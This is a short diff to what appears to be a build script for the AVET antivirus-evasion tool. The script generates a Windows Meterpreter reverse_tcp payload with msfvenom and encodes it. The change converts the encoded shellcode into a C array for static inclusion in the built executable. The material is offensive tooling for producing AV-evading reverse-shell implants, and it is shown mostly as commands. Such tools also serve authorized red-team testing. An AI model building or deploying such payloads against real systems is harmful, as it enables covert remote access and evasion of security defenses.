@@ -22,8 +22,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64
 # Apply AVET encoding via format.sh tool
 ./tools/format.sh input/sc.txt > input/scclean.txt
 
+# convert to c array format for static include
+./tools/data_raw_to_c/data_raw_to_c input/scclean.txt input/scarray.txt buf
+
 # set shellcode source
-set_shellcode_source static_from_file input/scclean.txt
+set_shellcode_source static_from_file input/scarray.txt
 
 # set decoder and key source
 # AVET decoder requires no key
